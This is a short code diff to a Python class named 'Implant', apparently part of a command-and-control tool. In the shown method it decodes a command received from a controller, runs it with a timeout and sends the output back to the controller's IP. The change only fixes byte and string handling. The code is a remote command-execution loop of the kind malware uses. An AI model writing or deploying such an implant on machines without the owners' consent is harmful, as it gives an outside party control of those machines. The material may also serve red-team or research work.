@@ -53,13 +53,14 @@ class Implant(Host):
         try:
             cmd = shellpack['data'].decode()
             stdout, stderr = self.run(cmd, 3)
-            if 'not found' in stderr:
+            stderr = stderr.decode()
+            if "not found" in stderr:
                 raise FileNotFoundError
             elif "Syntax error" in stderr:
                 raise SyntaxError
             elif "Timeout expired" in stderr:
                 raise TimeoutExpired
-            self.send(self.controller_ip, "instruction", stdout.encode())
+            self.send(self.controller_ip, "instruction", stdout)
             
         except TimeoutExpired:
             self.send(self.controller_ip, "instruction", b'The command has timed out', option="ERROR")
